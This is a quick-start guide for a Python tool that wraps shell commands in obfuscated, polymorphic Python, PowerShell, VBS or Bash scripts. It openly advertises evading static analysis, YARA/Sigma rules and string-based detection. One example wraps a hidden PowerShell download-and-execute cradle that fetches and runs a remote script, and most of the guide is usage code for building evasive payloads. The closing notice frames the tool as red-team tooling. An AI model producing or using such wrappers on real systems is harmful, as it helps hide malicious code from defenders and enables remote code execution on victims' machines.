# Enhanced Polymorphic Wrapper - Quick Start Guide

## Installation

No external dependencies beyond Python 3.7+ standard library.

```bash
cd /home/user/sc-generator
python3 polymorphic_wrapper_enhanced.py  # Run demo
```

## 5-Minute Quick Start

### Basic Usage

```python
from polymorphic_wrapper_enhanced import create_enhanced_polymorphic_wrapper

# Generate a simple wrapper
result = create_enhanced_polymorphic_wrapper(
    command="calc.exe",
    output_format="python",
    iterations=3
)

# Print the wrapper
print(result["wrapper"])

# Save to file
with open("wrapper.py", "w") as f:
    f.write(result["wrapper"])
```

### Different Output Formats

```python
# PowerShell wrapper
ps_result = create_enhanced_polymorphic_wrapper("whoami", output_format="powershell")

# VBS wrapper
vbs_result = create_enhanced_polymorphic_wrapper("whoami", output_format="vbs")

# Bash wrapper
bash_result = create_enhanced_polymorphic_wrapper("whoami", output_format="bash")
```

## Obfuscation Levels

### Minimal (Fast, Small)
```python
from polymorphic_wrapper_enhanced import EnhancedObfuscationConfig, EnhancedPolymorphicEncoder

config = EnhancedObfuscationConfig(
    add_junk_code=False,
    add_dead_code=False,
    add_variable_swapping=False
)
encoder = EnhancedPolymorphicEncoder(config)
```

### Standard (Balanced)
```python
config = EnhancedObfuscationConfig(
    add_junk_code=True,
    add_dead_code=False,
    add_variable_swapping=True
)
```

### Maximum (Maximum Evasion)
```python
config = EnhancedObfuscationConfig(
    add_junk_code=True,
    add_dead_code=True,
    add_variable_swapping=True,
    add_decoy_functions=True,
    junk_code_percentage=50,
    dead_code_percentage=30
)
```

## Obfuscation Techniques

| Technique | Default | Impact |
|-----------|---------|--------|
| Dead Code Injection | On | +20% size |
| Junk Code Injection | On | +30% size |
| Variable Swapping | On | Hides intent |
| Misleading Comments | On | Misdirects analysis |
| Decoy Functions | On | Dilutes signatures |
| Polymorphic Encoding | On | 8 strategies |

## Real-World Examples

### Example 1: Hide a PowerShell Command
```python
from polymorphic_wrapper_enhanced import create_enhanced_polymorphic_wrapper

command = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://example.com/ps1\')"'

result = create_enhanced_polymorphic_wrapper(
    command=command,
    output_format="python",
    iterations=3
)

print(result["wrapper"])
```

### Example 2: Batch Generate Multiple Formats
```python
command = "systemctl status nginx"

for fmt in ["python", "bash", "powershell"]:
    result = create_enhanced_polymorphic_wrapper(
        command=command,
        output_format=fmt
    )
    with open(f"wrapper.{fmt}", "w") as f:
        f.write(result["wrapper"])
```

### Example 3: High Evasion Configuration
```python
from polymorphic_wrapper_enhanced import *

config = EnhancedObfuscationConfig(
    add_junk_code=True,
    add_dead_code=True,
    add_variable_swapping=True,
    add_decoy_functions=True,
    junk_code_percentage=45,
    dead_code_percentage=25
)

encoder = EnhancedPolymorphicEncoder(config)

# Generate 5 different wrappers
for i in range(5):
    payload = encoder.encode("sensitive_command")
    print(f"Wrapper {i+1} generated with {payload['strategy']} strategy")
```

## What Gets Evaded?

✓ Static analysis tools (no pattern matching)
✓ YARA/Sigma rules (encoding diversity)
✓ String-based detection (no plaintext command)
✓ Quick automated analysis
✓ Basic deobfuscation tools

## Output Structure

```python
{
    "wrapper": str,              # Generated code
    "format": str,               # python/vbs/powershell/bash
    "iterations": int,           # Number of variants
    "command_hash": str,         # MD5 of original command
    "obfuscation_level": str,    # "MAXIMUM"
    "techniques": list,          # Applied techniques
    "statistics": {
        "total_invocations": int,
        "strategy_distribution": dict,
        "unique_strategies_used": int
    }
}
```

## Testing

Run the comprehensive test suite:

```bash
python3 test_enhanced_polymorphic.py
```

Run practical examples:

```bash
python3 enhanced_wrapper_examples.py
```

## Key Classes

### EnhancedPolymorphicEncoder
Main class for encoding

```python
encoder = EnhancedPolymorphicEncoder(config)
payload = encoder.encode("command")
wrapper = encoder.generate_enhanced_wrapper_script("command", iterations=3)
stats = encoder.get_statistics()
```

### JunkCodeGenerator
Generates obfuscation code

```python
from polymorphic_wrapper_enhanced import JunkCodeGenerator

gen = JunkCodeGenerator()
junk_vars = gen.generate_junk_variable_assignments()
comments = gen.generate_junk_comments()
dead_code = gen.generate_dead_code_block()
decoys = gen.generate_decoy_function(count=3)
```

### VariableSwapper
Renames variables

```python
from polymorphic_wrapper_enhanced import VariableSwapper

swapper = VariableSwapper()
new_name = swapper.generate_swap_name("original_var")
```

## Common Tasks

### Task: Obfuscate a single command
```python
result = create_enhanced_polymorphic_wrapper("whoami", output_format="python")
print(result["wrapper"])
```

### Task: Generate wrappers for a list of commands
```python
commands = ["id", "whoami", "ps aux"]
for cmd in commands:
    result = create_enhanced_polymorphic_wrapper(cmd, output_format="python")
    # Use the result...
```

### Task: Get statistics on strategies used
```python
encoder = EnhancedPolymorphicEncoder()
for _ in range(100):
    encoder.encode("cmd")
print(encoder.get_statistics())
```

### Task: Custom high-evasion configuration
```python
config = EnhancedObfuscationConfig(
    add_junk_code=True,
    add_dead_code=True,
    add_variable_swapping=True,
    add_decoy_functions=True,
    junk_code_percentage=50
)
encoder = EnhancedPolymorphicEncoder(config)
payload = encoder.encode("sensitive_command")
```

## Performance Guide

| Operation | Time |
|-----------|------|
| Encode single command | <50ms |
| Generate Python wrapper | <100ms |
| Generate 100 wrappers | ~5s |
| All tests | ~10s |

## Troubleshooting

### Wrapper won't execute
- Check command syntax is valid
- Ensure Python/PowerShell/Bash is available
- Verify output format matches target

### Commands appear in plaintext
- This shouldn't happen; please verify encoding is applied
- Check that obfuscation is enabled in config

### Size seems too large
- This is normal; obfuscation adds overhead
- Use minimal config for smaller output
- Maximum config adds 100-150% to original size

## Files Reference

- `polymorphic_wrapper_enhanced.py` - Main implementation
- `test_enhanced_polymorphic.py` - Test suite
- `enhanced_wrapper_examples.py` - Usage examples
- `ENHANCED_WRAPPER_DOCUMENTATION.md` - Full documentation
- `polymorphic_wrapper.py` - Original (for comparison)

## Support & Documentation

- Full API docs: See ENHANCED_WRAPPER_DOCUMENTATION.md
- Examples: Run enhanced_wrapper_examples.py
- Tests: Run test_enhanced_polymorphic.py
- Source code: Well-commented in polymorphic_wrapper_enhanced.py

## Legal Notice

This tool is for authorized security research, penetration testing, and red team operations only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before use.
